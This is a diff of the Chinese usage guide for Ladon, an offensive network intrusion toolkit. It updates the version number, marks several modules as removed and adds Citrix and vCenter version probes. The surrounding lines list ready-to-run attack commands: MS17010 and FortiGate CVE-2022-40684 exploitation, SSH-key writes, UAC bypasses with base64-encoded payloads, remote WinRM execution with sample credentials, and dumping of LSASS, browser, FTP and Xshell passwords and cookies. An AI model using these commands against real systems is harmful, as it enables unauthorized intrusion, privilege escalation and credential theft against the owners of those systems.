@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon 10.9 20230304
-简明用法例子 200例
+Ladon 10.10 20230318
+简明用法例子 202例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -100,7 +100,7 @@ Ladon 192.168.1.8/24 OnlineIP
 Ladon 192.168.1.8/24 MS17010
 
 ##### 020 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）
-Ladon 192.168.1.8/24 SMBGhost
+Ladon 192.168.1.8/24 SMBGhost	10.9移除
 
 ##### 021 扫描Web HTTP、HTTPS信息
 Ladon 192.168.1.8/24 WebScan
@@ -234,7 +234,7 @@ Ladon 192.168.1.8/24 SMBGhost
 ##### 057 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)
 Ladon 192.168.1.8/24 WeblogicPoc
 
-##### 058 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)
+##### 058 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)  10.9移除
 Ladon 192.168.1.8/24 PhpStudyPoc
 
 ##### 059 ActiveMQ漏洞检测(CVE-2016-3088)
@@ -321,8 +321,8 @@ Ladon WifiPwd
 ##### 080 读取FileZilla FTP密码
 Ladon FileZillaPwd
 
-##### 081 读取系统Hash、VPN密码、DPAPI-Key
-Ladon CVE-2021-36934
+##### 081 读取系统Hash、VPN密码、DPAPI-Key  10.9移除
+Ladon CVE-2021-36934  
 
 ##### 082 DumpLsass内存密码(mimikatz明文) 限9.1.1版本之前
 Ladon DumpLsass
@@ -447,7 +447,7 @@ Ladon WinrmExec 192.168.1.8 5985 k8gege.org Administrator K8gege520 calc.exe
 ##### 108 whoami查看当前用户权限以及特权	
 Ladon whoami
 
-##### 109  6种白名单BypassUAC(8.0后)Win7-Win10
+##### 109  6种白名单BypassUAC(8.0后)Win7-Win10  10.8版本移除
 用法: Ladon BypassUAC Method Base64Cmd
 
 Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
@@ -457,7 +457,7 @@ Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==
 
-##### 110 BypassUac2 绕过UAC执行,支持Win7-Win10 	
+##### 110 BypassUac2 绕过UAC执行,支持Win7-Win10 	10.8版本移除
 Ladon BypassUac2 c:\1.exe
 Ladon BypassUac2 c:\1.bat
 
@@ -723,7 +723,7 @@ Ladon https://192.168.1.8 CiscoScan
 Ladon ip.txt CiscoScan
 Ladon url.txt CiscoScan​
 
-##### 175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测
+##### 175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测  10.9移除
 Ladon noping ip CVE-2011-2523
 Ladon noping ip.txt vsFTPdPoc  
 
@@ -732,8 +732,10 @@ Ladon http://192.168.1.8 WpScan
 Ladon url.txt WpScan
 Ladon 192.168.1.8/24 WpScan http  扫描IP时添加http://
 
-##### 177  探测Exchange版本不会触发WAF
+##### 177  探测Exchange版本
+Ladon https://192.168.1.8 ExchangeVer
 Ladon 192.168.1.8/24 ExchangeVer
+Ladon url.txt ExchangeVer
 
 ##### 178  Exchange高危RCE漏洞检测
 Ladon https://192.168.1.8 ExchangePoc
@@ -767,7 +769,7 @@ Ladon FirefoxPwd
 Ladon FirefoxHistory
 Ladon FirefoxCookie
 
-##### 184  BypassUAC11无回显支持Win7、Win8、Win11 Win2012\2016\2019等
+##### 184  BypassUAC11无回显支持Win7、Win8、Win11 Win2012\2016\2019等 10.8版本移除
 Ladon40 BypassUAC11 cmd
 Ladon40 BypassUAC11 c:\1.bat
 Ladon40 BypassUAC11 c:\1.exe
@@ -784,7 +786,7 @@ Ladon url.txt DraytekScan
 ##### 187 XshellPwd Xshell密码读取
 Ladon XshellPwd
 
-##### 188 ForiGate CVE-2022-40684 未授权写SSH-KEY admin admin123
+##### 188 FortiGate CVE-2022-40684 未授权写SSH-KEY admin admin123
 Ladon 192.168.1.8 CVE-2022-40684
 Ladon https://192.168.1.8 CVE-2022-40684
 Ladon 192.168.1.8/24 CVE-2022-40684
@@ -852,5 +854,16 @@ Ladon url.txt JoomlaPwd
 Ladon 192.168.1.8/24 AllScan
 Ladon 192.168.1.8 AllScan
 Ladon http://192.168.1.8 AllScan
+
+##### 201 探测Citrix Gateway版本
+Ladon https://192.168.1.8 CitrixVer
+Ladon 192.168.1.8/24 CitrixVer
+Ladon url.txt CitrixVer
+
+##### 202 探测Vmware Vcenter版本
+Ladon https://192.168.1.8 VmwareVer
+Ladon 192.168.1.8/24 VmwareVer
+Ladon url.txt VcenterVer
+
 
 =======================================================
